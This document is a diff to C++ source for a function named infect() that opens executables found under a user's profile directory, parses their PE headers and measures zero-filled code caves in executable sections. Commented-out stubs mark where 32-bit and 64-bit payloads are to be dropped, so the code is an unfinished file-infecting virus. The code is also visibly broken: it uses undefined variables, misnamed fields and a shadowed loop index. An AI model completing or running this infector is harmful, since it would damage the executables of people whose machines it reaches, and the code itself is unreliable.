@@ -252,11 +252,90 @@ int infect(void)
 
    for (std::size_t i=0; i<found_executables_size; ++i)
    {
-      std::wcout << "\t" << found_executables[i] << std::endl;
+      char *executable = found_executables[i];
+      HANDLE exe_handle = CreateFileA(executable,
+                                      GENERIC_READ,
+                                      0,
+                                      nullptr,
+                                      OPEN_EXISTING,
+                                      FILE_ATTRIBUTE_NORMAL,
+                                      nullptr);
+
+      if (exe_handle == INVALID_HANDLE_VALUE)
+      {
+         std::wcout << "\tFailed to open " << found_executable << std::endl;
+         goto end_exe_loop;
+      }
+
+      DWORD file_size = GetFileSize(exe_handle, nullptr);
+
+      if (file_size == INVALID_FILE_SIZE)
+      {
+         std::wcout << "\t" << found_executable << " is larger than 4gb" << std::endl;
+         goto close_file;
+      }
+
+      std::uint8_t *exe_buffer = reinterpret_cast<std::uint8_t *>(malloc(file_size));
+      DWORD bytes_read = 0;
+
+      if (!ReadFile(exe_handle, exe_buffer, file_size, &bytes_read, nullptr))
+      {
+         std::wcout << "\tFailed to read " << found_executable << std::endl;
+         goto free_file;
+      }
+
+      IMAGE_DOS_HEADER *dos_header = reinterpret_cast<PIMAGE_DOS_HEADER>(exe_buffer);
+      IMAGE_NT_HEADERS32 *nt_headers = reinterpret_cast<PIMAGE_NT_HEADERS32>(exe_buffer+dos_header->e_lfanew);
+      std::size_t nt_headers_size = sizeof(DWORD)+sizeof(IMAGE_FILE_HEADER)+nt_headers->FileHeader.SizeOfOptionalHeader;
+      IMAGE_SECTION_HEADER *section_table = reinterpret_cast<PIMAGE_SECTION_HEADER>(exe_buffer+dos_header->e_lfanew+nt_headers_size);
+
+      std::wcout << "\tScanning " << found_executable << "..." << std::endl;
+
+      for (std::size_t i=0; i<nt_headers->FileHeader.NumberOfSections; ++i)
+      {
+         IMAGE_SECTION_HEADER *section = &section_table[i];
+
+         if ((section->characteristics & IMAGE_SCN_MEM_EXECUTE) != IMAGE_SCN_MEM_EXECUTE)
+            continue;
+
+         std::uint8_t *section_end = exe_buffer+section->PointerToRawData+section->SizeOfRawData;
+         std::uint8_t *cave_begin = section_end-1;
+
+         while (*cave_begin == 0)
+            --cave_begin;
+         
+         std::wcout << "\t\tFound code section " << section->Name << " with cave size " << reinterpret_cast<std::uintptr_t>(section_end - cave_begin) << std::endl;
+      }
+      
+      /*
+      if (nt_headers->OptionalHeader.Machine == IMAGE_NT_OPTIONAL_HDR64_MAGIC)
+      {
+         /* drop 64-bit payload 
+      }
+      else
+      {
+         /* drop 32-bit payload
+      }
+      */
+      
+      /* check to see if it's a 32-bit PE file or a 64-bit PE file and create pointers as necessary
+         check the section table for executable sections
+         determine the size of the code caves, if any
+      */
+
+   free_file:
+      free(exe_buffer);
+      exe_buffer = nullptr;
+
+   close_file:
+      CloseHandle(exe_handle);
+      
+   end_exe_loop:
       free(found_executables[i]);
    }
 
    free(found_executables);
+   free(profile_directory);
 
    return 0;
 }
